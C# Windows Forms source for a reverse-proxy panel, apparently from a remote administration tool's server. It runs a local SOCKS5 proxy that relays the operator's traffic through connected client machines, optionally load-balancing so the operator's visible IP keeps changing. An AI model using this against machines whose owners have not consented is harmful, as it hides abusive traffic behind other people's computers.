using System;
using System.Globalization;
using System.Net.Sockets;
using System.Windows.Forms;
using xServer.Core.Data;
using xServer.Core.ReverseProxy;
using xServer.Core.Helper;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmReverseProxy : Form
    {
        private readonly Client[] _clients;
        private ReverseProxyServer SocksServer { get; set; }
        private ReverseProxyClient[] _openConnections;
        private Timer _refreshTimer;

        public FrmReverseProxy(Client[] clients)
        {
            this._clients = clients;

            foreach (Client c in clients)
            {
                if (c == null || c.Value == null) continue;
                c.Value.FrmProxy = this;
            }

            InitializeComponent();
        }

        private void FrmReverseProxy_Load(object sender, EventArgs e)
        {
            if (_clients.Length > 1)
            {
                this.Text = "Reverse Proxy [Load-Balancer is active]";
                lblLoadBalance.Text = "The Load Balancer is active, " + _clients.Length + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works";
            }
            else if (_clients.Length == 1)
            {
                this.Text = WindowHelper.GetWindowTitle("Reverse Proxy", _clients[0]);
                lblLoadBalance.Text = "The Load Balancer is not active, only 1 client is used, select multiple clients to activate the load balancer";
            }
            nudServerPort.Value = Settings.ReverseProxyPort;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                ushort port = GetPortSafe();

                if (port == 0)
                {
                    MessageBox.Show("Please enter a valid port > 0.", "Please enter a valid port", MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    return;
                }

                SocksServer = new ReverseProxyServer();
                SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
                SocksServer.StartServer(_clients, "0.0.0.0", port);
                ToggleButtons(true);

                _refreshTimer = new Timer();
                _refreshTimer.Tick += RefreshTimer_Tick;
                _refreshTimer.Interval = 100;
                _refreshTimer.Start();
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show("The port is already in use.", "Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(
                        string.Format(
                            "An unexpected socket error occurred: {0}\n\nError Code: {1}\n\nPlease report this as fast as possible here:\n{2}/issues",
                            ex.Message, ex.ErrorCode, Settings.RepositoryURL), "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                btnStop_Click(sender, null);
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format(
                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\n{1}/issues",
                        ex.Message, Settings.RepositoryURL), "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                btnStop_Click(sender, null);
            }
        }

        void RefreshTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                lock (SocksServer)
                {
                    this._openConnections = SocksServer.OpenConnections;
                    lstConnections.VirtualListSize = this._openConnections.Length;
                    lstConnections.Refresh();
                }
            }
            catch { }
        }

        private ushort GetPortSafe()
        {
            var portValue = nudServerPort.Value.ToString(CultureInfo.InvariantCulture);
            ushort port;
            return (!ushort.TryParse(portValue, out port)) ? (ushort)0 : port;
        }

        void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
        {

        }

        void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
        {

        }

        private void ToggleButtons(bool t)
        {
            btnStart.Enabled = !t;
            nudServerPort.Enabled = !t;
            btnStop.Enabled = t;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (_refreshTimer != null)
                _refreshTimer.Stop();
            ToggleButtons(false);
            if (SocksServer != null)
                SocksServer.Stop();

            try
            {
                SocksServer.OnConnectionEstablished -= socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection -= socksServer_onUpdateConnection;
            }
            catch { }
        }

        private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.ReverseProxyPort = GetPortSafe();
            //Stop the proxy server if still active
            btnStop_Click(sender, null);

            for (int i = 0; i < _clients.Length; i++)
            {
                if (_clients[i] != null && _clients[i].Value != null)
                    _clients[i].Value.FrmProxy = null;
            }
        }

        private void nudServerPort_ValueChanged(object sender, EventArgs e)
        {
            lblProxyInfo.Text = string.Format("Connect to this SOCKS5 Proxy: 127.0.0.1:{0} (no user/pass)", nudServerPort.Value);
        }

        private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
            lock (SocksServer)
            {
                if (e.ItemIndex < _openConnections.Length)
                {
                    ReverseProxyClient connection = _openConnections[e.ItemIndex];

                    e.Item = new ListViewItem(new string[]
                    {
                        connection.Client.EndPoint.ToString(),
                        connection.Client.Value.Country,
                        (connection.HostName.Length > 0 && connection.HostName != connection.TargetServer) ? string.Format("{0}  ({1})", connection.HostName, connection.TargetServer) : connection.TargetServer,
                        connection.TargetPort.ToString(),
                        FileHelper.GetDataSize(connection.LengthReceived),
                        FileHelper.GetDataSize(connection.LengthSent),
                        connection.Type.ToString()
                    }) { Tag = connection };
                }
            }
        }

        private void killConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lock (SocksServer)
            {
                if (lstConnections.SelectedIndices.Count > 0)
                {
                    //copy the list, it could happen the suddenly the items de-select
                    int[] items = new int[lstConnections.SelectedIndices.Count];
                    lstConnections.SelectedIndices.CopyTo(items, 0);

                    foreach (int index in items)
                    {
                        if (index < _openConnections.Length)
                        {
                            ReverseProxyClient connection = _openConnections[index];
                            if (connection != null)
                            {
                                connection.Disconnect();
                            }
                        }
                    }
                }
            }
        }
    }
}
